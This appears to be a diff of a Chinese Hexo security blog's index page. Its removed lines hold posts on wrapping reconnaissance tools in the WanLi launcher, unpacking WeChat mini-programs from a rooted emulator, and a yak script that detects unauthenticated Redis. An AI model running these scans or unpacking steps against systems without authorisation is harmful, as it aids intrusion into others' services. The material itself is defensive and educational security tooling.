@@ -1,946 +1,430 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-  <meta charset="utf-8">
-  
-
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta property="og:type" content="website">
+<meta property="og:title" content="GMF信息小站">
+<meta property="og:url" content="https://givemefivw.github.io/index.html">
+<meta property="og:site_name" content="GMF信息小站">
+<meta property="og:locale">
+<meta property="article:author" content="givemefivw">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>GMF信息小站</title>
+    <!-- styles -->
+    
 <link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
 <meta name="generator" content="Hexo 5.4.1"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4">
+        
+          <header id="header">
+  <a href="/">
+  
+    
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+    
+  
+    <div id="title">
+      <h1>GMF信息小站</h1>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Inicio</a></li><!--
+   --><!--
+     --><li><a href="/about/">Acerca de</a></li><!--
+   --><!--
+     --><li><a href="/archives/">Articulos</a></li><!--
+   --><!--
+     --><li><a href="/projects_url">Proyectos</a></li><!--
+   -->
+    </ul>
   </div>
 </header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-Make-Arsenal-from-Wanli" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/02/23/Make-Arsenal-from-Wanli/" class="article-date">
-  <time datetime="2022-02-23T08:26:55.000Z" itemprop="datePublished">2022-02-23</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
         
+        <section id="about">
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/23/Make-Arsenal-from-Wanli/">Make Arsenal from Wanli</a>
-    </h1>
   
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x01Wanli简介"><a href="#0x01Wanli简介" class="headerlink" title="0x01Wanli简介"></a>0x01Wanli简介</h2><p>官方一点的说法是方便红队人员对目标站点进行安全检测，快速获取资产，但作者最开始也在公众号文章说过，最初的设定是“把常用的工具给做了一个调用整合到一个程序内，功能拓展比较方便，目前是根据自己的一些习惯写的，比如目录扫描、子域名爆破+验证、漏洞扫描”</p>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ExpLangcn/WanLi">https://github.com/ExpLangcn/WanLi</a></p>
-<p>仓库最新版是作者重构的2.2版本，相比前面的初始版本，代码结构更为规范化。</p>
-<p>本篇文章依据Wanli的初始版本。</p>
-<h2 id="0x02-正文部分"><a href="#0x02-正文部分" class="headerlink" title="0x02 正文部分"></a>0x02 正文部分</h2><p>将初始版本下载到本地，安装一下依赖，主界面如下：</p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/main_page.png" alt="Untitled"></p>
-<p>打开项目，首先看<code>config</code>文件，这里定义的是工具的位置，因为是Windows环境，所以需要加入双反斜杠：</p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/config.png" alt="Untitled"></p>
-<p>打开主程序<code>Wanli.py</code>这里可以自定义<code>banner</code>信息：</p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/banner.png" alt="Untitled"></p>
-<p>从第85行开始，进入项目核心程序，作者使用了cmd2库：</p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/main_code.png" alt="Untitled"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dirscan_parser = Cmd2ArgumentParser()</span><br><span class="line">    dirscan_parser.add_argument(</span><br><span class="line">        <span class="string">&quot;url&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;扫描单个Web应用敏感文件及敏感地址,dirscan &lt;https://www.baidu.com/&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @cmd2.with_argparser(<span class="params">dirscan_parser</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_dirscan</span>(<span class="params">self, args</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;扫描单个Web应用敏感文件及敏感地址,dirscan &lt;https://www.baidu.com/&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> args.url != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            lib.cmd.wanli.dirscan(args.url)</span><br></pre></td></tr></table></figure>
-
-<p>跟进<code>cmd.wanli.dirscan(args.url)</code>函数：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dirscan</span>(<span class="params">url</span>):</span><br><span class="line">    datatime = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d-%H-%M-%S&#x27;</span>)</span><br><span class="line">    system(<span class="string">r&quot;start cmd /k &quot;</span> + config.config.PYTHON + <span class="string">&quot; &quot;</span> +config.config.dirsearch +<span class="string">r&quot; -u &quot;</span> + url + <span class="string">&quot; -t 100&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>前面说过，Wanli最开始的定位就相当于一个快速启动脚本，所以它的逻辑很清晰，注册参数，输入url，自动执行函数调用工具运行扫描。</p>
-<p>那么我们就可以非常容易的对Wanli进行扩充，比如我们增加Finger指纹扫描：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">finger_parser = Cmd2ArgumentParser()</span><br><span class="line">    finger_parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-f&quot;</span>, nargs=<span class="string">&#x27;?&#x27;</span>,<span class="built_in">help</span>=<span class="string">&quot;调用Finger指纹对文本批量指纹扫描, finger -f url.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @cmd2.with_argparser(<span class="params">finger_parser</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_finger</span>(<span class="params">self,args</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;调用Finger指纹对文本批量指纹扫描, finger -f url.txt&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> args.f:</span><br><span class="line">            file = args.f</span><br><span class="line">            system(<span class="string">r&quot;start cmd /k &quot;</span> + config.config.PYTHON + <span class="string">&quot; &quot;</span> + config.config.finger + <span class="string">&quot; &quot;</span> + <span class="string">r&quot;-f&quot;</span> + <span class="string">&quot; &quot;</span> + file + <span class="string">r&quot; -o xlsx&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>运行程序查看参数，因为这里用的是新开窗口，所以运行一个参数之后在Wanli的命令行中可以继续执行下一条命令，无需等待当前程序运行结束：</p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/finger.png" alt="Untitled"></p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/finger_result.png" alt="Untitled"></p>
-<p>同样，再次新增一个参数，调用<code>subfinder</code>域名爆破,<code>ksubdomain</code>验证模式,输出csv：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">domainbrute_parser = Cmd2ArgumentParser()</span><br><span class="line">    domainbrute_parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-d&quot;</span>, nargs=<span class="string">&#x27;?&#x27;</span>,<span class="built_in">help</span>=<span class="string">&quot;调用subfinder域名爆破,ksubdomain验证模式,输出csv, domainbrute -d baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @cmd2.with_argparser(<span class="params">domainbrute_parser</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_domainbrute</span>(<span class="params">self,args</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;调用subfinder域名爆破,ksubdomain验证模式,输出csv, domainbrute -d baidu.com&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> args.d:</span><br><span class="line">            domain = args.d</span><br><span class="line">            datatime = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d-%H-%M-%S&#x27;</span>)</span><br><span class="line">            system(<span class="string">r&quot;start cmd /k &quot;</span> + config.config.subfinder + <span class="string">r&quot; -d &quot;</span> + domain + <span class="string">&quot; -o G:\\\\Arsenal\\\\PenFrameWork\\\\WanLi\\\\results\\\\domainbrute\\\\&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(domain))</span><br><span class="line">            time.sleep(<span class="number">30</span>)</span><br><span class="line">            system(<span class="string">r&quot;start cmd /k &quot;</span> + config.config.ksubdomain + <span class="string">&quot; -verify -f G:\\\\Arsenal\\\\PenFrameWork\\\\WanLi\\\\results\\\\domainbrute\\\\&#123;&#125;.txt -csv -o G:\\\\Arsenal\\\\PenFrameWork\\\\WanLi\\\\results\\\\domainbrute\\\\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(domain,datatime))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/domain.png" alt="Untitled"></p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/subdomain.png" alt="Untitled"></p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/ksubdomain.png" alt="Untitled"></p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/domain_result.png" alt="Untitled"></p>
-<p>通过Wanli我们可以简化命令行窗口和重复性的输入命令。</p>
-<p>当前的2.2版本Wanli定位变成了面向红队的快速工具。</p>
-<p>查看仓库中<code>core/domain.py</code>文件，可以发现相比初始版本，当前版本变得稍显复杂，也稍显规范化</p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/domain_new.png" alt="Untitled"></p>
-<p>当前版本Windows安装可能会出现如下情况：</p>
-<p><img src="/2022/02/23/Make-Arsenal-from-Wanli/wrong.png" alt="Untitled"></p>
-<p><code>curses</code>依赖无法通过pip直接安装，需要先去<a target="_blank" rel="noopener" href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#curses%E7%BD%91%E7%AB%99%E4%B8%8B%E8%BD%BD%60whl%60%E6%96%87%E4%BB%B6%EF%BC%8C%E5%86%8D%E9%80%9A%E8%BF%87pip%E5%AE%89%E8%A3%85%EF%BC%88%E4%BD%86%E6%88%91%E5%90%8C%E6%A0%B7%E6%B2%A1%E6%9C%89%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%EF%BC%8C%E6%89%80%E4%BB%A5%E6%B2%A1%E6%9C%892.2%E7%89%88%E6%9C%AC%E8%BF%90%E8%A1%8C%E7%9A%84%E6%88%AA%E5%9B%BE%EF%BC%89">https://www.lfd.uci.edu/~gohlke/pythonlibs/#curses网站下载`whl`文件，再通过pip安装（但我同样没有安装成功，所以没有2.2版本运行的截图）</a></p>
-<p>相比于初始版本，当前2.2版本扩充性稍减，毕竟定位发生了变化。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/23/Make-Arsenal-from-Wanli/" data-id="cl0oq0f7a000qh0v0hnkq7mdj" class="article-share-link">Share</a>
+    <p>
+      Encuentrame en
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Wechat-small-program-Unpack" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/02/16/Wechat-small-program-Unpack/" class="article-date">
-  <time datetime="2022-02-16T02:38:53.000Z" itemprop="datePublished">2022-02-16</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+      
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/16/Wechat-small-program-Unpack/">Wechat small program Unpack</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这种<code>unpack</code>方法早在一年之前就有up主发过文章，偶然之间看到顺手试了一下做个记录</p>
-<p>原文地址：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;https://www.bilibili.com/read/cv9986715&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-正文部分"><a href="#0x02-正文部分" class="headerlink" title="0x02 正文部分"></a>0x02 正文部分</h2><p>用到的工具：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">node</span><br><span class="line">npm</span><br><span class="line">mumu模拟器</span><br><span class="line">Root Exploer文件浏览器</span><br><span class="line">wxappUnpacker</span><br></pre></td></tr></table></figure>
-
-<p>首先，在模拟器安装好RE文件浏览器</p>
-<p>之后登陆微信，随便打开一个小程序</p>
-<p>之后打开RE文件浏览器，会提示需要<code>root</code>权限，这里就是使用模拟器的用处，真机普通情况下无法<code>root</code></p>
-<p><img src="/2022/02/16/Wechat-small-program-Unpack/re_exploer.png" alt="Untitled"></p>
-<p>点击允许之后，会进入RE文件浏览器页面</p>
-<p>微信小程序的默认文件位置：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.tencent.mm/MicroMsg/(一串长字符)/appbrand/pkg</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/16/Wechat-small-program-Unpack/pkgs.png" alt="Untitled"></p>
-<p>这里因为之前用过小程序导致文件比较多，如果是第一次使用这个文件夹是空的，或者也可以根据时间来筛选，一般是两个数据包，一个主包一个子包</p>
-<p>将两个数据包打包发送到本地</p>
-<p>接下来安装<code>wxappUnpacker</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;https://github.com/xuedingmiaojun/wxappUnpacker&gt;</span><br></pre></td></tr></table></figure>
-
-<p>根据安装文档</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line"></span><br><span class="line">npm install esprima</span><br><span class="line">    </span><br><span class="line">npm install css-tree</span><br><span class="line">    </span><br><span class="line">npm install cssbeautify</span><br><span class="line">    </span><br><span class="line">npm install vm2</span><br><span class="line">    </span><br><span class="line">npm install uglify-es</span><br><span class="line">    </span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure>
-
-<p>这里有一个小插曲，<code>npm install</code> 依赖的时候，总是报错：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm ERR! code ECONNREFUSED</span><br><span class="line">npm ERR! errno ECONNREFUSED</span><br><span class="line">npm ERR! FetchError: request to &lt;http://registry.npmjs.org/vm2&gt; failed, reason:connect ECONNREFUSED <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1181</span></span><br></pre></td></tr></table></figure>
-
-<p>在<code>StackOverflow</code>找到了解决办法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> proxy null</span><br><span class="line">npm config <span class="built_in">set</span> https-proxy null</span><br><span class="line">npm config <span class="built_in">set</span> registry &lt;http://registry.npmjs.org/&gt;</span><br></pre></td></tr></table></figure>
-
-<p>将npm代理配置之后再次install，就可以正常安装了。</p>
-<p>之后，开始进行解包：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node wuWxapkg.js xxxx.wxapkg</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/16/Wechat-small-program-Unpack/unpack.png" alt="Untitled"></p>
-<p>打开解包的文件夹</p>
-<p><img src="/2022/02/16/Wechat-small-program-Unpack/pkg_full.png" alt="Untitled"></p>
-<p>此时就可以对小程序js或html文件进行分析，进一步进行渗透</p>
-<p><img src="/2022/02/16/Wechat-small-program-Unpack/code.png" alt="Untitled"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/16/Wechat-small-program-Unpack/" data-id="cl0oq0f7c0011h0v00yla2iof" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Learn-yaklang-from-Redis-Unauthorize" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/" class="article-date">
-  <time datetime="2022-02-14T02:48:29.000Z" itemprop="datePublished">2022-02-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          <a class="icon" target="_blank" rel="noopener" href="http://github.com/givemefivw" aria-label="github">
+            <i class="fab fa-github"></i><!--
+      ---></a><!--
+    ---><!--
+    --->, 
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/">Learn yaklang from Redis Unauthorize</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="从Redis未授权简单学习yak语言"><a href="#从Redis未授权简单学习yak语言" class="headerlink" title="从Redis未授权简单学习yak语言"></a>从Redis未授权简单学习yak语言</h1><h2 id="0x01-yak语言简介"><a href="#0x01-yak语言简介" class="headerlink" title="0x01 yak语言简介"></a>0x01 yak语言简介</h2><p><code>yak</code>是一款专门为渗透测试而生的编程开发语言，是国际上首个致力于网络安全底层能力融合的 垂直开发语言，提供了非常强大的安全能力，<code>Yak</code>是绝大部分 “数据描述语言 &#x2F; 容器语言” 的超集，也是图灵完备的脚本语言。通过函数提供各类底层安全能力，包括端口扫描、指纹识别、<code>poc</code>框架、<code>shell</code>管理、<code>MITM</code>劫持、强大的插件系统等。</p>
-<h2 id="0x02-正文部分"><a href="#0x02-正文部分" class="headerlink" title="0x02 正文部分"></a>0x02 正文部分</h2><p>本篇文章出于小白的角度，结合学习<code>yak官方文档</code>，开发自己的第一个插件。</p>
-<p>在<code>yak</code>出现之前，我们更习惯使用<code>Python</code>脚本来编写个人的<code>PoC</code>，一个最最最简单的检测方法如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((host, <span class="number">6379</span>))</span><br><span class="line">            s.send(<span class="built_in">bytes</span>(<span class="string">&quot;INFO\r\n&quot;</span>, <span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">            result = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">	             core.checksuc(target=host,name=<span class="string">&#x27;Redis unauthorize&#x27;</span>,payload=<span class="string">&#x27;INFO&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>检测思路非常简单，首先与目标及端口建立socket连接，之后向目标发送INFO这个字节，然后根据对方返回给我们的响应是否包含redis_version的关键字节来判断是否存在Redis未授权访问。</p>
-<p>那么就可以使用同样的思路使用yak编写。</p>
-<p>首先，我们先设定<code>log</code>级别：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.setLevel(<span class="string">&quot;info&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后我们需要设定两个参数，<code>target</code>和<code>port</code>，同时对这两个参数的输入有一个初步的判断：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">target = cli.String(<span class="string">&quot;target&quot;</span>)</span><br><span class="line">// 这里就是判断如果target输入是空，那么程序会退出，输出Empty Target</span><br><span class="line"><span class="keyword">if</span> target == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    die(<span class="string">&quot;Empty Target&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">port = cli.Int(<span class="string">&quot;port&quot;</span>, cli.setDefault(<span class="number">6379</span>))</span><br><span class="line"><span class="keyword">if</span> port &lt;= <span class="number">0</span> &#123;</span><br><span class="line">    die(<span class="string">&quot;Port is invalid&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>接着我们和目标及端口建立连接并判断建立是否成功，失败的话输出具体的错误信息：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conn,err = tcp.Connect(target, port)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">    log.Info(<span class="string">&quot;Connect to %v failed: %v&quot;</span>, target, err)</span><br><span class="line">&#125;</span><br><span class="line">die(err)</span><br></pre></td></tr></table></figure>
-
-<p>成功建立连接之后，我们就向目标发送<code>info</code>字节：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log.Info(<span class="string">&quot;write info to %v&quot;</span>, target)</span><br><span class="line">conn.Send(<span class="string">&quot;info\r\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>接着我们对目标返回响应进行判断：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log.Info(<span class="string">&quot;Start to waiting result&quot;</span>)</span><br><span class="line">result, err := conn.RecvStringTimeout(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">str</span>.Contains(result, <span class="string">&quot;redis_version&quot;</span>) &#123;</span><br><span class="line">    log.info(<span class="string">&quot;Found Redis未授权访问漏洞&quot;</span>, <span class="built_in">str</span>.HostPort(target, port))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>就这样，一个非常基础简单的未授权检测脚本就写好了，测试一下看看：</p>
-<p><img src="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/yak_ini.png" alt="Untitled"></p>
-<p>很有趣对吧。</p>
-<p>有了基础的框架之后，我们就可以进行添加功能，比如结果保存至自定义文本、批量扫描，这里以自定义文本举例：</p>
-<p>首先要满足自定义文本，我们需要用到yak的file函数，根据文档，<code>file.Open(&quot;test-file.txt&quot;)</code>等效为<code>file.OpenFile(&quot;test-file.txt&quot;, file.O_CREATE|file.O_RDWR, 0777)</code></p>
-<p>那么我们就可以如下构建：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Save the results to %v&quot;</span>,out_put)</span><br><span class="line">f,err := file.Open(out_put)</span><br><span class="line">die(err)</span><br><span class="line">f.Write(result)</span><br><span class="line">f.Close()</span><br></pre></td></tr></table></figure>
-
-<p>这里的out_put参数也就是新添加的参数：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">out_put = cli.String(<span class="string">&quot;output&quot;</span>,cli.setDefault(<span class="string">&quot;_result.txt&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> out_put == <span class="string">&quot;&quot;</span>&#123;</span><br><span class="line">    die(<span class="string">&quot;Empty output&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里我们是把目标<code>redis</code>运行<code>info</code>的结果保存到本地，此时运行：</p>
-<p><img src="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/yak_final.png" alt="Untitled"></p>
-<p>此时目录下会自动创建一个redis.txt的文本，内容为info的具体信息：</p>
-<p><img src="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/yak_info.png" alt="Untitled"></p>
-<p>如果我们想进行批量扫描，同样也需要file函数按行读写功能，这里暂不赘述：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f, err := file.Open(<span class="string">&quot;12_fileio.yak&quot;</span>)</span><br><span class="line">die(err)</span><br><span class="line">dump(f.ReadLines())</span><br><span class="line">f.Close()</span><br></pre></td></tr></table></figure>
-
-<p>yak脚本编写完成之后，我们运行<code>Yakit</code>，尝试编写一个<code>Yakit插件</code>：</p>
-<p>首先新建一个插件，填写基础信息：</p>
